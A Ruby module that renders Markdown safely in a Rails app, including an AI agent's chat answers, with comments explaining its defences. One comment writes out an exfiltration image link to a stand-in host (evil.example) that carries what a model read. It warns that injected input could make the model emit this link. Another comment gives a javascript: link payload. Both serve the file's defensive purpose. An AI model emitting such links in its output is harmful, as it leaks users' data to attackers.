# frozen_string_literal: true

# Markdown to HTML for the pages that render tracked Markdown: /docs
# (DocsController) and a dream's story on /dreams (DreamsHelper), and for an
# agent's answer in the CTO web chat (cto_chats/_turn).
#
# `images: false` (the chat) renders a Markdown image as a LINK, never an <img>:
# an answer is model-written from untrusted input (a message, an attached image
# or PDF), and an <img> loads the moment the page draws it, so an injected
# `![](https://evil.example/?q=<what the model read>)` would send data out with
# no click. A link only goes anywhere when the reader chooses to follow it.
#
# Raw HTML is filtered (`filter_html`), and a link, autolink or image whose scheme is not
# on SAFE_SCHEMES renders as its literal Markdown text, never an <a href>. So
# `[x](javascript:alert(1))` shows as text instead of a clickable script.
#
# `new_tab: true` (the chat, task cto-pill-count-and-links) opens a link that
# leaves the hub in a new tab: an absolute http(s) or protocol-relative URL whose
# host is not one of the hub's own (site_hosts) gets target="_blank" rel="noopener".
# A site path, an anchor, a mailto and a link to the hub itself stay in the tab.
# The renderer writes these two attributes itself; raw HTML is still filtered, so
# an answer cannot add them, or any other attribute, by hand.
#
# Why not Redcarpet's own `safe_links_only: true`: it also refuses every RELATIVE
# link (`[role](../agents/pokemon/role.md)`, `[x](#anchor)` passes but `role.md`
# does not), and the docs link to each other relatively all over. A link with no
# scheme is a path on this site, so it stays a link.
module SafeMarkdown
  SAFE_SCHEMES = %w[http https mailto].freeze

  # A URL scheme as a browser reads it: leading whitespace and control characters
  # dropped, tabs and newlines inside the scheme ignored (`java\nscript:` is
  # `javascript:`), case folded.
  SCHEME = /\A([a-z][a-z0-9+.\-]*):/i

  RENDER_OPTIONS = { hard_wrap: true, filter_html: true }.freeze
  MARKDOWN_OPTIONS = { fenced_code_blocks: true, tables: true, autolink: true,
                       strikethrough: true, no_intra_emphasis: true }.freeze

  module_function

  def render(markdown, images: true, new_tab: false)
    renderer = images ? Renderer : NoImageRenderer
    Redcarpet::Markdown.new(renderer.new(**RENDER_OPTIONS).tap { |r| r.new_tab = new_tab }, **MARKDOWN_OPTIONS)
                       .render(markdown.to_s).html_safe # rubocop:disable Rails/OutputSafety
  end

  # True when a link target is a site path or carries a scheme on SAFE_SCHEMES.
  def safe_url?(url)
    scheme = url.to_s.gsub(/[\x00-\x20\x7F]/, "")[SCHEME, 1]
    scheme.nil? || SAFE_SCHEMES.include?(scheme.downcase)
  end

  # The hub's own hostnames, read from config (a chat turn also renders in a
  # broadcast, with no request): the mailer's default host (APP_HOST in
  # production), APP_HOST and APP_HOST_ALIASES. A leading "www." is ignored.
  def site_hosts
    configured = (Rails.application.config.action_mailer.default_url_options || {})[:host]
    [ configured, ENV["APP_HOST"], *ENV.fetch("APP_HOST_ALIASES", "").split(",") ]
      .map { |host| bare_host(host) }.compact_blank.uniq
  end

  # True when a link target is a page on another host: an absolute http(s) or
  # protocol-relative URL whose host is not the hub's. Paths, anchors and mailto
  # are not.
  def off_site?(url)
    href = url.to_s.gsub(/[\x00-\x20\x7F]/, "")
    return false unless href.match?(%r{\A(https?:)?//}i)

    host = bare_host(URI.parse(href).host)
    host.present? && !site_hosts.include?(host)
  rescue URI::InvalidURIError
    true
  end

  def bare_host(host) = host.to_s.strip.downcase.delete_suffix(".").delete_prefix("www.")

  # Redcarpet's HTML renderer with the link, autolink and image callbacks checked. Returning nil
  # from a callback makes Redcarpet emit the span's original Markdown as text.
  class Renderer < Redcarpet::Render::HTML
    include ERB::Util

    attr_accessor :new_tab

    def link(url, title, content)
      return nil unless SafeMarkdown.safe_url?(url)

      title_attr = title.to_s.empty? ? "" : %( title="#{html_escape(title)}")
      %(<a href="#{html_escape(url)}"#{title_attr}#{target_attr(url)}>#{content}</a>)
    end

    def autolink(url, link_type)
      href = link_type == :email && !url.start_with?("mailto:") ? "mailto:#{url}" : url
      return nil unless SafeMarkdown.safe_url?(href)

      %(<a href="#{html_escape(href)}"#{target_attr(href)}>#{html_escape(url)}</a>)
    end

    private

    # ` target="_blank" rel="noopener"` for an off-site link when new_tab is on.
    def target_attr(url)
      new_tab && SafeMarkdown.off_site?(url) ? %( target="_blank" rel="noopener") : ""
    end

    public

    def image(url, title, alt_text)
      return nil unless SafeMarkdown.safe_url?(url)

      title_attr = title.to_s.empty? ? "" : %( title="#{html_escape(title)}")
      %(<img src="#{html_escape(url)}" alt="#{html_escape(alt_text)}"#{title_attr}>)
    end
  end

  # The chat's renderer: an image is a link to it, labelled by its alt text
  # (or "image"), so nothing loads until the reader clicks.
  class NoImageRenderer < Renderer
    def image(url, _title, alt_text)
      return nil unless SafeMarkdown.safe_url?(url)

      label = alt_text.to_s.strip.empty? ? "image" : alt_text
      target = new_tab && SafeMarkdown.off_site?(url) ? %( target="_blank") : ""
      %(<a href="#{html_escape(url)}"#{target} rel="nofollow noopener noreferrer">#{html_escape(label)}</a>)
    end
  end
end
